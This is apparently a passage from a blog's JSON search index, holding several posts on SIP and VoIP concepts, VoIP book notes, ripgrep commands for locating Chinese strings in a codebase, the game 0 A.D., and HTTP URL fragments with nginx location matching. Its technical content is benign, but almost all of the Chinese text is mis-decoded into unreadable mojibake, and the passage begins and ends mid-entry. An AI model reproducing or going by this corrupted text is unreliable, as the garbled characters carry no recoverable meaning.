ä¾‹å¦‚sipç»ˆç«¯ï¼Œè½¯ç”µè¯ï¼Œè¯æœº UAS: sipæœåŠ¡å™¨ UA: uaæ—¢å¯ä»¥å½“åšuacä¹Ÿå¯ä»¥å½“åšuas ä»£ç†æœåŠ¡å™¨ é‡å®šå‘æœåŠ¡å™¨ æ³¨å†ŒæœåŠ¡å™¨ ç½‘å…³ PSTN å…¬å…±äº¤æ¢ç”µè¯ç½‘ 2. SBC è¾¹ç•Œä¼šè¯æ§åˆ¶å™¨ SBCæ˜¯Session Border Controllerçš„ç¼©å†™ï¼Œå…·æœ‰ä¸€ä¸‹å‡ ä¸ªåŠŸèƒ½ã€‚\næ‹“æ‰‘éšè—ï¼šéšè—æ‰€æœ‰å†…éƒ¨ç½‘ç»œçš„ä¿¡æ¯ã€‚ åª’ä½“æµç®¡ç†ï¼šè®¾ç½®è¯­éŸ³æµç¼–ç è§„åˆ™ï¼Œè½¬æ¢ç­‰ å¢åŠ èƒ½åŠ›ï¼šä¾‹å¦‚Refer, 3CPP ç»´æŠ¤NATæ˜ å°„ï¼š è®¿é—®æ§åˆ¶ åª’ä½“åŠ å¯†ï¼šä¾‹å¦‚å¤–éƒ¨ç½‘ç»œç”¨SRTP, å†…éƒ¨ç½‘ç»œç”¨RTP 3. sipæ³¨å†Œè¿‡ç¨‹ ä¸‹é¢ç®€åŒ–æ³¨å†Œé€»è¾‘ï¼Œçœç•¥äº†éªŒè¯å’Œè¿‡æœŸç­‰å­—æ®µï¼š\nå¯¹äºåˆ†æœºæ¥è¯´ï¼Œæ³¨å†ŒæœåŠ¡å™¨çš„åœ°å€æ˜¯éœ€è¦è®¾ç½®çš„ åˆ†æœºå‘æ³¨å†ŒæœåŠ¡å™¨å‘è¯·æ±‚ï¼Œè¯´ï¼šä½ å¥½ï¼Œæ³¨å†ŒæœåŠ¡å™¨ï¼Œæˆ‘æ˜¯8005ï¼Œæˆ‘çš„åœ°å€æ˜¯200.180.1.1ï¼Œä»¥åä½ å¯ä»¥ç”¨è¿™ä¸ªåœ°å€è”ç³»æˆ‘ã€‚ æ³¨å†ŒæœåŠ¡å™¨å›å¤ï¼šå¥½çš„ï¼Œæ³¨å†ŒæˆåŠŸ 4. sipæœåŠ¡å™¨çš„ç±»å‹ 4.1. ä»£ç†æœåŠ¡å™¨ 4.2. é‡å®šå‘æœåŠ¡å™¨ 4.3. èƒŒé èƒŒUAæœåŠ¡å™¨ èƒŒé èƒŒUAæœåŠ¡å™¨æœ‰ä¸¤ä¸ªä½œç”¨\néšè—ç½‘ç»œæ‹“æ‰‘ç»“æ„ æœ‰äº›æ—¶å€™ï¼Œè·¯ç”±æ— æ³•åˆ°è¾¾ï¼Œåªèƒ½ç”¨èƒŒé èƒŒUAæœåŠ¡å™¨ 5. å¸¸ç”¨sipè¯·æ±‚æ–¹æ³• æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ä¸‹é¢çš„\nå¸¸ç”¨çš„å‡ ä¸ªæ˜¯ï¼šregister, invite, ack, bye, cancelã€‚é™¤äº†cancelå’Œackä¸éœ€è¦è®¤è¯å¤–ï¼Œå…¶ä½™çš„è¯·æ±‚éƒ½éœ€è¦è®¤è¯ã€‚ registerè‡ªä¸å¿…è¯´ï¼Œinviteå’Œbyeæ˜¯éœ€è¦è®¤è¯çš„ã€‚\nå¯¹äºæˆ‘ä»¬ä¸ä¿¡ä»»çš„uaï¼Œæˆ‘ä»¬ä¸å…è®¸ä»–ä»¬å‘¼å«ã€‚å¯¹äºæœªè®¤è¯çš„byeï¼Œä¹Ÿéœ€è¦ç¦æ­¢ã€‚åè€…å¯ä»¥é˜²æ­¢æ¶æ„çš„byeè¯·æ±‚ï¼ŒæŒ‚æ–­æ­£å¸¸çš„å‘¼å«ã€‚\ninviteé™¤äº†re-inviteçš„æƒ…å†µï¼Œå…¶ä½™çš„éƒ½å±äºåˆå§‹åŒ–è¯·æ±‚ï¼Œéœ€è¦ç€é‡å…³å¿ƒçš„ã€‚è€Œå¯¹äºbyeè¿™ç§åºåˆ—åŒ–è¯·æ±‚ï¼Œåªéœ€è¦æŒ‰ç…§record-routeå»è·¯ç”±ã€‚\n6. sipå“åº”çŠ¶æ€ç  7. sipå¯¹è¯æµç¨‹å›¾ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œä»inviteè¯·æ±‚åˆ°200okä¹‹é—´çš„ä¿¡ä»¤ï¼Œéƒ½ç»è¿‡äº†ä»£ç†æœåŠ¡å™¨ã€‚ä½†æ˜¯200okä¹‹åçš„ackï¼Œç¡®æ²¡æœ‰ç»è¿‡ä»£ç†æœåŠ¡å™¨ï¼Œå¦‚æœæƒ³è¦æ‰€æœ‰ä¿¡ä»¤éƒ½ç»è¿‡ä»£ç†æœåŠ¡å™¨ï¼Œéœ€è¦åœ¨sipæ¶ˆæ¯å¤´record-routing æŒ‡å®šä»£ç†æœåŠ¡å™¨çš„åœ°å€\n8. è¯·æ±‚ä¸å“åº”æŠ¥æ–‡ 9. äº‹åŠ¡ä¸å¯¹è¯çš„åŒºåˆ« é‡ç‚¹ï¼š\nä»INVITEè¯·æ±‚åˆ°æœ€ç»ˆçš„å“åº”ï¼ˆæ³¨æ„1xxä¸æ˜¯æœ€ç»ˆå“åº”ï¼Œé1xxçš„éƒ½æ˜¯æœ€ç»ˆå“åº”ï¼‰ä¹‹é—´ï¼Œç§°ä¸ºäº‹åŠ¡ã€‚ä¸€ä¸ªäº‹åŠ¡å¯ä»¥å¸¦æœ‰å¤šä¸ªæ¶ˆæ¯ç»„æˆï¼Œå¹¶ç»è¿‡å¤šä¸ªuaã€‚ ackè¯·æ±‚æ¯”è¾ƒç‰¹æ®Šï¼Œä½†æ˜¯ackä¸æ˜¯äº‹åŠ¡ã€‚å¦‚æœè¢«å«æ¥é€šåï¼Œè¶…æ—¶æœªæ”¶åˆ°ä¸»å«æ–¹çš„ack, ä¼šæ€æ ·ï¼Ÿæ˜¯å¦ä¼šå†æ¬¡å‘é€200OK tcpä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼Œsipï¼šinvite-\u0026gt;200ok-\u0026gt;ackï¼Œå¯ä»¥ç†è§£ä¸ºä¸‰æ¬¡æ¡æ‰‹å»ºç«‹å¯¹è¯ã€‚ byeè¯·æ±‚å’Œ200okç®—ä½œä¸€ä¸ªäº‹åŠ¡ dialogå»ºç«‹çš„å‰ææ˜¯å‘¼å«æ¥é€šï¼Œå¦‚æœå‘¼å«æ²¡æœ‰æ¥é€šï¼Œåˆ™æ²¡æœ‰dialogã€‚ dialogå¯ä»¥ç”±ä¸‰ä¸ªå…ƒç´ å”¯ä¸€ç¡®å®šã€‚callId, fromå­—æ®µä¸­çš„tag, toå­—æ®µä¸­çš„tagã€‚ 10.","title":"SIPåè®®ç®€ä»‹"},{"content":"1. æ¦‚å¿µç†è§£ åŠ¡å¿…è¦èƒ½ç†è§£SIPçš„é‡è¦æ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯äº‹åŠ¡ã€Dialogã€‚å‚è€ƒhttps://www.yuque.com/wangdd/opensips/fx5pyy æ¦‚å¿µæ˜¯éå¸¸é‡è¦çš„ä¸œè¥¿ï¼Œä¸ç†è§£æ¦‚å¿µï¼Œè¶Šå­¦å°±ä¼šè¶ŠåƒåŠ› 2. æ—¶åºå›¾ æ—¶åºå›¾æ˜¯éå¸¸é‡è¦çš„ï¼ŒåŸ¹è®­æ—¶ï¼Œä¸€èˆ¬æˆ‘ä¼šè¦æ±‚å­¦å‘˜åŠ¡å¿…èƒ½å¤Ÿæ‰‹å·¥ç»˜åˆ¶æ—¶åºå›¾ã€‚å› ä¸ºåªæœ‰èƒ½å¤Ÿæ‰‹å·¥ç»˜åˆ¶æ—¶åºå›¾äº†ï¼Œåœ¨æ’æŸ¥é—®é¢˜æ—¶ï¼Œæ‰èƒ½å¤Ÿä»æŠ“åŒ…å·¥å…·ç»™å‡ºçš„æ—¶åºå›¾ä¸­åˆ†æå‡ºé—®é¢˜æ‰€åœ¨ã€‚\nRFC3665 https://datatracker.ietf.org/doc/html/rfc3665 ä¸­æä¾›äº†å¾ˆå¤šç»å…¸çš„æ—¶åºå›¾ï¼Œå»ºè®®å¯ä»¥å»ä¸´æ‘¹ã€‚\n","permalink":"https://wdd.js.org/opensips/ch1/study-tips/","summary":"1. æ¦‚å¿µç†è§£ åŠ¡å¿…è¦èƒ½ç†è§£SIPçš„é‡è¦æ¦‚å¿µï¼Œç‰¹åˆ«æ˜¯äº‹åŠ¡ã€Dialogã€‚å‚è€ƒhttps://www.yuque.com/wangdd/opensips/fx5pyy æ¦‚å¿µæ˜¯éå¸¸é‡è¦çš„ä¸œè¥¿ï¼Œä¸ç†è§£æ¦‚å¿µï¼Œè¶Šå­¦å°±ä¼šè¶ŠåƒåŠ› 2. æ—¶åºå›¾ æ—¶åºå›¾æ˜¯éå¸¸é‡è¦çš„ï¼ŒåŸ¹è®­æ—¶ï¼Œä¸€èˆ¬æˆ‘ä¼šè¦æ±‚å­¦å‘˜åŠ¡å¿…èƒ½å¤Ÿæ‰‹å·¥ç»˜åˆ¶æ—¶åºå›¾ã€‚å› ä¸ºåªæœ‰èƒ½å¤Ÿæ‰‹å·¥ç»˜åˆ¶æ—¶åºå›¾äº†ï¼Œåœ¨æ’æŸ¥é—®é¢˜æ—¶ï¼Œæ‰èƒ½å¤Ÿä»æŠ“åŒ…å·¥å…·ç»™å‡ºçš„æ—¶åºå›¾ä¸­åˆ†æå‡ºé—®é¢˜æ‰€åœ¨ã€‚\nRFC3665 https://datatracker.ietf.org/doc/html/rfc3665 ä¸­æä¾›äº†å¾ˆå¤šç»å…¸çš„æ—¶åºå›¾ï¼Œå»ºè®®å¯ä»¥å»ä¸´æ‘¹ã€‚","title":"å­¦ä¹ å»ºè®®"},{"content":" ä¹¦å Packet Guide to Voip over IP ä½œè€… Bruce Hartpence çŠ¶æ€ å·²è¯»å®Œ ç®€ä»‹ Go under the hood of an operating Voice over IP network, and build your knowledge of protocol \u0026hellip;. è¯»åæ„Ÿ æ–°æŠ€æœ¯å‡ºç°çš„æ—¶æœº Pulling the trigger early might put you at risk of making the wrong decision in terms of vendor or protocol. Adopting late might put you behind the competition or make you rush to deploy a system that is not well understood by the local staff.\næŠ€æœ¯åº”ç”¨å‡ºç°çš„å¤ªæ—©åˆ™ä¼šæ‰¿å—å·¨å¤§çš„é£é™©ï¼Œå‡ºç°çš„å¤ªæ™šåˆ™å¤±å»ç«äº‰åŠ›ã€‚\nä¸¤ç§SIPä¿¡ä»¤ VoIP protocols are broken into two categories: signaling and transport.\nVoIPçš„ä¿¡ä»¤å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œä¼ è¾“ä¿¡ä»¤ ä¸ ä¼ è¾“åª’ä½“\nç¾æ¢¦ä¸å™©æ¢¦ It was a golden dream for some (consumers) and a nightmare for others; namely, the providers.\næ–°æŠ€æœ¯çš„å‡ºç°ï¼Œå¯¹å¼€æ‹“è€…æ¥è¯´æ˜¯é»„é‡‘ç¾æ¢¦ï¼Œå¯¹å®ˆæ—§è€…æ¥è¯´ï¼Œåˆ™æ˜¯å™©æ¢¦ã€‚\nå‡ºå±€ Some of these services offered calling plans for less than half the price of traditional carriers. Some of them, most notably Skype, had as one of their goals putting telephone companies out of business\nUDPçš„å¦ä¸€ç§ç†è§£ In fact,UDP is sometimes considered a fire-and-forget protocol because once the packet leaves the sender, we think nothing more about it.\nUDPå¯ä»¥ç†è§£æˆä¸€ç§ä¸€æ—¦å‘é€ï¼Œåˆ™å¿˜è®°çš„åè®®ã€‚\n","permalink":"https://wdd.js.org/posts/2022/07/vl3zhk/","summary":"ä¹¦å Packet Guide to Voip over IP ä½œè€… Bruce Hartpence çŠ¶æ€ å·²è¯»å®Œ ç®€ä»‹ Go under the hood of an operating Voice over IP network, and build your knowledge of protocol \u0026hellip;. è¯»åæ„Ÿ æ–°æŠ€æœ¯å‡ºç°çš„æ—¶æœº Pulling the trigger early might put you at risk of making the wrong decision in terms of vendor or protocol. Adopting late might put you behind the competition or make you rush to deploy a system that is not well understood by the local staff.","title":"è¯»ä¹¦ç¬”è®° - Packet Guide to VoIP"},{"content":"1. å‰æè¯´æ˜ é¡¹ç›®å·²ç»å¤„äºç»´æŠ¤æœŸ é¡¹ç›®ä¸€å¼€å§‹å¹¶æ²¡æœ‰è€ƒè™‘å¤šè¯­è¨€ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹éƒ½æ˜¯å†™æ­»çš„ä¸­æ–‡ ç°åœ¨è¦ç»™è¿™ä¸ªé¡¹ç›®æ·»åŠ å¤šè¯­è¨€é€‚é… 2. å·¥å…·é€‰æ‹© https://www.npmjs.com/package/i18n https://www.npmjs.com/package/vue-i18n 3. éš¾ç‚¹ é¡¹ç›®å¾ˆå¤§ï¼Œä¸­æ–‡å¯èƒ½å­˜åœ¨äºå„ç§æ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚html, vue, js, typescriptç­‰ç­‰ï¼Œ äººå·¥æŸ¥æ‰¾ä¸ç°å® æ‰€ä»¥é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯è¦æ‰¾å‡ºæ‰€æœ‰çš„ä¸­æ–‡è¯­å¥ 4. è®©æ–‡æœ¬é£ å®‰è£…ripgrep apt-get instal ripgrep æœç´¢æ‰€æœ‰åŒ…å«ä¸­æ–‡çš„ä»£ç : rg -e '[\\p{Han}]' \u0026gt; han.all.md ç»™æ‰€æœ‰åŒ…å«ä¸­æ–‡çš„ä»£ç ï¼ŒæŒ‰ç…§æ–‡ä»¶åï¼Œå’Œå‡ºç°çš„æ¬¡æ•°æ’åº: cat han.all.md | awk -F: '{print $1}' | uniq -c | sort -nr \u0026gt; stat.han.md è¿™ä¸€æ­¥ä¸»è¦æ˜¯çœ‹çœ‹å“ªäº›æ–‡ä»¶åŒ…å«çš„ä¸­æ–‡æ¯”è¾ƒå¤š æŒ‰ç…§ä¸­æ–‡çš„è¯­å¥ï¼Œæ’åºå¹¶ç»Ÿè®¡å‡ºç°çš„æ¬¡æ•°: cat han.all.md |rg -o -e '([\\p{Han}]+)' | sort | uniq -c | sort -nr \u0026gt; word.han.md ç»è¿‡ä¸Šé¢4æ­¥ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥å®šä½å‡ºå“ªäº›ä»£ç ä¸­åŒ…å«ä¸­æ–‡ï¼Œä¸­æ–‡çš„è¯­å¥æœ‰å“ªäº›ã€‚\n","permalink":"https://wdd.js.org/posts/2022/07/mv0hk1/","summary":"1. å‰æè¯´æ˜ é¡¹ç›®å·²ç»å¤„äºç»´æŠ¤æœŸ é¡¹ç›®ä¸€å¼€å§‹å¹¶æ²¡æœ‰è€ƒè™‘å¤šè¯­è¨€ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹éƒ½æ˜¯å†™æ­»çš„ä¸­æ–‡ ç°åœ¨è¦ç»™è¿™ä¸ªé¡¹ç›®æ·»åŠ å¤šè¯­è¨€é€‚é… 2. å·¥å…·é€‰æ‹© https://www.npmjs.com/package/i18n https://www.npmjs.com/package/vue-i18n 3. éš¾ç‚¹ é¡¹ç›®å¾ˆå¤§ï¼Œä¸­æ–‡å¯èƒ½å­˜åœ¨äºå„ç§æ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚html, vue, js, typescriptç­‰ç­‰ï¼Œ äººå·¥æŸ¥æ‰¾ä¸ç°å® æ‰€ä»¥é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯è¦æ‰¾å‡ºæ‰€æœ‰çš„ä¸­æ–‡è¯­å¥ 4. è®©æ–‡æœ¬é£ å®‰è£…ripgrep apt-get instal ripgrep æœç´¢æ‰€æœ‰åŒ…å«ä¸­æ–‡çš„ä»£ç : rg -e '[\\p{Han}]' \u0026gt; han.all.md ç»™æ‰€æœ‰åŒ…å«ä¸­æ–‡çš„ä»£ç ï¼ŒæŒ‰ç…§æ–‡ä»¶åï¼Œå’Œå‡ºç°çš„æ¬¡æ•°æ’åº: cat han.all.md | awk -F: '{print $1}' | uniq -c | sort -nr \u0026gt; stat.han.md è¿™ä¸€æ­¥ä¸»è¦æ˜¯çœ‹çœ‹å“ªäº›æ–‡ä»¶åŒ…å«çš„ä¸­æ–‡æ¯”è¾ƒå¤š æŒ‰ç…§ä¸­æ–‡çš„è¯­å¥ï¼Œæ’åºå¹¶ç»Ÿè®¡å‡ºç°çš„æ¬¡æ•°: cat han.all.md |rg -o -e '([\\p{Han}]+)' | sort | uniq -c | sort -nr \u0026gt; word.han.md ç»è¿‡ä¸Šé¢4æ­¥ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥å®šä½å‡ºå“ªäº›ä»£ç ä¸­åŒ…å«ä¸­æ–‡ï¼Œä¸­æ–‡çš„è¯­å¥æœ‰å“ªäº›ã€‚","title":"ä¸­é€”å¤šè¯­è¨€é€‚é…"},{"content":" 1. æˆ‘ä¸ºä»€ä¹ˆä¼šçŸ¥é“0 A.D. è¿™æ¬¾æ¸¸æˆï¼Ÿ æœ€è¿‘åˆ‡æ¢åˆ°windowså¼€å‘ï¼Œç”¨äº†scoopè¿™ä¸ªåŒ…ç®¡ç†å·¥å…·æ¥å®‰è£…è½¯ä»¶ï¼Œéšä¾¿é€›é€›çš„æ—¶å€™ï¼Œå‘ç°scoopè¿˜å¯ä»¥ç”¨æ¥å®‰è£…æ¸¸æˆï¼Œç„¶åæˆ‘å°±åœ¨é‡Œé¢çœ‹äº†ä¸€ä¸‹ï¼Œç„¶åæ’åç¬¬ä¸€çš„æ˜¯ä¸€ä¸ªåå« 0 A.D.çš„æ¸¸æˆï¼Œç„¶åæˆ‘å°±å®‰è£…ï¼Œå¹¶è¯•ç©äº†ä¸€ä¸‹ã€‚\n2. 0 A.D. è¿™ä¸ªåå­—æ˜¯å•¥æ„æ€ï¼Ÿ åŸºç£æ•™ç§°è€¶ç¨£è¯ç”Ÿçš„é‚£å¹´ä¸ºå…¬å…ƒå…ƒå¹´ï¼Œ A.D. å°±æ˜¯Anno Dominiï¼ˆA.D.ï¼‰ï¼ˆæ‹‰ä¸ï¼‰çš„ç¼©å†™ï¼Œå¯¹åº”çš„å…¬å…ƒå‰å°±æ˜¯è€Œåœ¨è€¶ç¨£è¯ç”Ÿä¹‹å‰ï¼Œç§°ä¸ºB.C. Before Christï¼ˆB.C.ï¼‰.\næˆ‘ä»¬ç°åœ¨çš„é˜³å†ï¼Œä¾‹å¦‚ä»Šå¹´æ˜¯2022å¹´ï¼Œè¿™å…¶å®å°±æ˜¯å…¬å…ƒ2022å¹´ã€‚å¯¹åº”çš„å…¬å…ƒå…ƒå¹´ï¼Œå¯¹ä¸­å›½æ¥è¯´ï¼Œå¤§è‡´åœ¨è¥¿æ±‰å¹´é—´ã€‚\næ‰€ä»¥ 0 A.D. å…¶å®çš„æ„æ€å°±æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„å…ƒå¹´ã€‚\nâ€œ0 A.D.â€ is a time period that never actually existed:\n3. 0 A.D. æ˜¯ä»€ä¹ˆç±»å‹çš„æ¸¸æˆï¼Ÿ å¦‚æœä½ ç©è¿‡çº¢è­¦ï¼Œ0 A.D.çš„æœ‰ç‚¹åƒçº¢è­¦ã€‚ å®˜æ–¹çš„ä»‹ç»0ADæ˜¯ä¸€ä¸ªåŸºäºå†å²çš„å®æ—¶ç­–ç•¥æ¸¸æˆã€‚ å¦‚æœä½ ç©è¿‡éƒ¨è½å†²çªï¼Œ0ADå…¶å®ä¹Ÿæœ‰ç‚¹ç±»ä¼¼éƒ¨è½å†²çªã€‚\n4. 0 A.D. æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ è·¨å¹³å°ï¼Œ windows, mac, linuxéƒ½å¯ä»¥ç© å…è´¹ å†å²æ‚ ä¹…ï¼Œé¡¹ç›®å¼€å§‹äº2001 è¿˜å¤„äºå¼€å‘é˜¶æ®µ å¯ç©æ€§è¿˜ä¸é”™ åŸºäºçœŸå®å†å²ï¼Œæ‰€ä»¥ç©æ¸¸æˆçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯èƒ½å¤Ÿå­¦ç‚¹å†å²çš„ã€‚é‡Œé¢æœ‰æ˜¯14ä¸ªæ–‡æ˜ã€‚ 5. æœ‰å“ªäº›ç©æ³• å•æœºå’ŒAIå¯¹æˆ˜ åœ¨çº¿ç»„é˜Ÿç© 6. FAQ å¦‚ä½•è®¾ç½®ä¸­æ–‡ç•Œé¢ é»˜è®¤çš„æ¸¸æˆä¸å¸¦ä¸­æ–‡è¯­è¨€çš„ï¼Œå®é™…ä¸Šå®ƒæ˜¯æœ‰ä¸­æ–‡çš„è¯­è¨€åŒ…çš„ï¼Œå¯ä»¥å‚è€ƒ å‚è€ƒ https://baike.baidu.com/item/%E5%85%AC%E5%85%83/17855 ","permalink":"https://wdd.js.org/posts/2022/07/gxog1n/","summary":" 1. æˆ‘ä¸ºä»€ä¹ˆä¼šçŸ¥é“0 A.D. è¿™æ¬¾æ¸¸æˆï¼Ÿ æœ€è¿‘åˆ‡æ¢åˆ°windowså¼€å‘ï¼Œç”¨äº†scoopè¿™ä¸ªåŒ…ç®¡ç†å·¥å…·æ¥å®‰è£…è½¯ä»¶ï¼Œéšä¾¿é€›é€›çš„æ—¶å€™ï¼Œå‘ç°scoopè¿˜å¯ä»¥ç”¨æ¥å®‰è£…æ¸¸æˆï¼Œç„¶åæˆ‘å°±åœ¨é‡Œé¢çœ‹äº†ä¸€ä¸‹ï¼Œç„¶åæ’åç¬¬ä¸€çš„æ˜¯ä¸€ä¸ªåå« 0 A.D.çš„æ¸¸æˆï¼Œç„¶åæˆ‘å°±å®‰è£…ï¼Œå¹¶è¯•ç©äº†ä¸€ä¸‹ã€‚\n2. 0 A.D. è¿™ä¸ªåå­—æ˜¯å•¥æ„æ€ï¼Ÿ åŸºç£æ•™ç§°è€¶ç¨£è¯ç”Ÿçš„é‚£å¹´ä¸ºå…¬å…ƒå…ƒå¹´ï¼Œ A.D. å°±æ˜¯Anno Dominiï¼ˆA.D.ï¼‰ï¼ˆæ‹‰ä¸ï¼‰çš„ç¼©å†™ï¼Œå¯¹åº”çš„å…¬å…ƒå‰å°±æ˜¯è€Œåœ¨è€¶ç¨£è¯ç”Ÿä¹‹å‰ï¼Œç§°ä¸ºB.C. Before Christï¼ˆB.C.ï¼‰.\næˆ‘ä»¬ç°åœ¨çš„é˜³å†ï¼Œä¾‹å¦‚ä»Šå¹´æ˜¯2022å¹´ï¼Œè¿™å…¶å®å°±æ˜¯å…¬å…ƒ2022å¹´ã€‚å¯¹åº”çš„å…¬å…ƒå…ƒå¹´ï¼Œå¯¹ä¸­å›½æ¥è¯´ï¼Œå¤§è‡´åœ¨è¥¿æ±‰å¹´é—´ã€‚\næ‰€ä»¥ 0 A.D. å…¶å®çš„æ„æ€å°±æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„å…ƒå¹´ã€‚\nâ€œ0 A.D.â€ is a time period that never actually existed:\n3. 0 A.D. æ˜¯ä»€ä¹ˆç±»å‹çš„æ¸¸æˆï¼Ÿ å¦‚æœä½ ç©è¿‡çº¢è­¦ï¼Œ0 A.D.çš„æœ‰ç‚¹åƒçº¢è­¦ã€‚ å®˜æ–¹çš„ä»‹ç»0ADæ˜¯ä¸€ä¸ªåŸºäºå†å²çš„å®æ—¶ç­–ç•¥æ¸¸æˆã€‚ å¦‚æœä½ ç©è¿‡éƒ¨è½å†²çªï¼Œ0ADå…¶å®ä¹Ÿæœ‰ç‚¹ç±»ä¼¼éƒ¨è½å†²çªã€‚\n4. 0 A.D. æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ è·¨å¹³å°ï¼Œ windows, mac, linuxéƒ½å¯ä»¥ç© å…è´¹ å†å²æ‚ ä¹…ï¼Œé¡¹ç›®å¼€å§‹äº2001 è¿˜å¤„äºå¼€å‘é˜¶æ®µ å¯ç©æ€§è¿˜ä¸é”™ åŸºäºçœŸå®å†å²ï¼Œæ‰€ä»¥ç©æ¸¸æˆçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯èƒ½å¤Ÿå­¦ç‚¹å†å²çš„ã€‚é‡Œé¢æœ‰æ˜¯14ä¸ªæ–‡æ˜ã€‚ 5. æœ‰å“ªäº›ç©æ³• å•æœºå’ŒAIå¯¹æˆ˜ åœ¨çº¿ç»„é˜Ÿç© 6. FAQ å¦‚ä½•è®¾ç½®ä¸­æ–‡ç•Œé¢ é»˜è®¤çš„æ¸¸æˆä¸å¸¦ä¸­æ–‡è¯­è¨€çš„ï¼Œå®é™…ä¸Šå®ƒæ˜¯æœ‰ä¸­æ–‡çš„è¯­è¨€åŒ…çš„ï¼Œå¯ä»¥å‚è€ƒ å‚è€ƒ https://baike.baidu.com/item/%E5%85%AC%E5%85%83/17855 ","title":"0 A.D. ä¸€æ¬¾å¼€å‘äº†21å¹´è¿˜æœªreleaseçš„æ¸¸æˆ"},{"content":"HTTP URLçš„æ ¼å¼å¤ä¹  ://:@:/;?#frag\nscheme åè®®ï¼Œ å¸¸è§çš„æœ‰http, https, file, ftpç­‰ : ç”¨æˆ·åå’Œå¯†ç  host ä¸»æœºæˆ–è€…IP port ç«¯å£å· path è·¯å¾„ params å‚æ•° ç”¨çš„æ¯”è¾ƒå°‘ query æŸ¥è¯¢å‚æ•° frag ç‰‡æ®µï¼Œèµ„æºçš„ä¸€éƒ¨åˆ†ï¼Œæµè§ˆå™¨ä¸ä¼šæŠŠè¿™éƒ¨åˆ†å‘ç»™æœåŠ¡ç«¯ å…³äºfragç‰‡æ®µ æµè§ˆå™¨åŠ è½½ä¸€ä¸ªç½‘é¡µï¼Œç½‘é¡µå¯èƒ½æœ‰å¾ˆå¤šç« èŠ‚çš„å†…å®¹ï¼Œfragç‰‡æ®µå¯ä»¥å‘Šè¯‰æµè§ˆå™¨ï¼Œåº”è¯¥å°†æŸä¸ªç‰¹å®šçš„ç‚¹æ˜¾ç¤ºåœ¨æµè§ˆå™¨ä¸­ã€‚\nä¾‹å¦‚ https://github.com/wangduanduan/jsplumb-chinese-tutorial/blob/master/api/anchors.js#L18\nè¿™é‡Œçš„#L8å°±æ˜¯ä¸€ä¸ªfragç‰‡æ®µï¼Œ å½“æµè§ˆå™¨æ‰“å¼€è¿™ä¸ªé¡µé¢çš„æ—¶ï¼Œå°±ä¼šè·³åˆ°å¯¹åº”çš„è¡Œ\nåœ¨ç½‘ç»œé¢æ¿ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå®é™…ä¸Šæµè§ˆå™¨å‘å‡ºçš„è¯·æ±‚ï¼Œä¹Ÿæ²¡æœ‰å¸¦æœ‰fragå‚æ•°\nVue åœ¨Vueä¸­ï¼Œé»˜è®¤çš„è·¯ç”±å°±æ˜¯è¿™ç§fragç‰‡æ®µã€‚ è¿™ç§è·¯ç”±åªå¯¹æµè§ˆå™¨æœ‰æ•ˆï¼Œå¹¶ä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ã€‚\næ‰€ä»¥åœ¨ä¸€ä¸ªå•é¡µåº”ç”¨ä¸­ï¼ŒæœåŠ¡ç«¯æ˜¯æ— æ³•æ ¹æ®URLçŸ¥é“ç”¨æˆ·è®¿é—®çš„æ˜¯ä»€ä¹ˆé¡µé¢çš„ã€‚\næ‰€ä»¥å®é™…ä¸Šnginxæ— æ³•æ ¹æ®fragç‰‡æ®µè¿›è¡Œæ‹¦æˆªã€‚\nnginxè·¯å¾„æ‹¦æˆª location [modifier] [URI] { ... ... } modifier\n= å®Œå…¨åŒ¹é… ^~ æ­£åˆ™åŒ¹é…ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ä»¥ç‰¹å®šçš„URLå¼€å¤´ ~ æ­£åˆ™åŒ¹é…ï¼Œä¸”å¤§å°å†™æ•æ„Ÿ ~* æ­£åˆ™åŒ¹é…ï¼Œå¤§å°å†™ä¸æ•æ„Ÿ nginxè·¯å¾„åŒ¹é…è§„åˆ™\né¦–å…ˆä½¿å®Œå…¨åŒ¹é…ï¼Œä¸€æ—¦åŒ¹é…ï¼Œåˆ™åŒ¹é…ç»“æŸï¼Œè¿›è¡Œåç»­æ•°æ®å¤„ç† å®Œå…¨åŒ¹é…æ— æ³•æ‰¾åˆ°ï¼Œåˆ™è¿›è¡Œæœ€é•¿URLåŒ¹é…ï¼Œç±»ä¼¼ ^~ æœ€é•¿åŒ¹é…æ‰¾ä¸åˆ°ï¼Œåˆ™æŒ‰ç…§ ~æˆ–è€…~*çš„æ–¹å¼åŒ¹é… æœ€åæŒ‰ç…§ / çš„é»˜è®¤åŒ¹é… ","permalink":"https://wdd.js.org/posts/2022/07/gt6a84/","summary":"HTTP URLçš„æ ¼å¼å¤ä¹  ://:@:/;?#frag\nscheme åè®®ï¼Œ å¸¸è§çš„æœ‰http, https, file, ftpç­‰ : ç”¨æˆ·åå’Œå¯†ç  host ä¸»æœºæˆ–è€…IP port ç«¯å£å· path è·¯å¾„ params å‚æ•° ç”¨çš„æ¯”è¾ƒå°‘ query æŸ¥è¯¢å‚æ•° frag ç‰‡æ®µï¼Œèµ„æºçš„ä¸€éƒ¨åˆ†ï¼Œæµè§ˆå™¨ä¸ä¼šæŠŠè¿™éƒ¨åˆ†å‘ç»™æœåŠ¡ç«¯ å…³äºfragç‰‡æ®µ æµè§ˆå™¨åŠ è½½ä¸€ä¸ªç½‘é¡µï¼Œç½‘é¡µå¯èƒ½æœ‰å¾ˆå¤šç« 